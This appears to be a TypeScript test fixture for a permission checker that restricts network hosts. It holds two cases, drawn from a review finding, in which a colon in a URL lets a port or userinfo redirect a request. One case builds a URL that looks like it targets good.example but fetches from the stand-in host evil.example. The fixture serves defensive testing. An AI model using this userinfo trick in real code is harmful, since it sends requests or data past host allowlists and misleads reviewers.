// Found in the pre-release review: `:` ended the host, so the rest of the authority
// (a port, or userinfo) could redirect the request.
/** @perm net(good.example) */
export function viaPort(p: string) {
  return fetch(`https://good.example:${p}/v1`); // expect: error PERM001 net
}

/** @perm net(good.example) */
export function viaUserinfo(p: string) {
  return fetch(`https://good.example:x@evil.example/${p}`); // expect: error PERM001 net(evil.example)
}
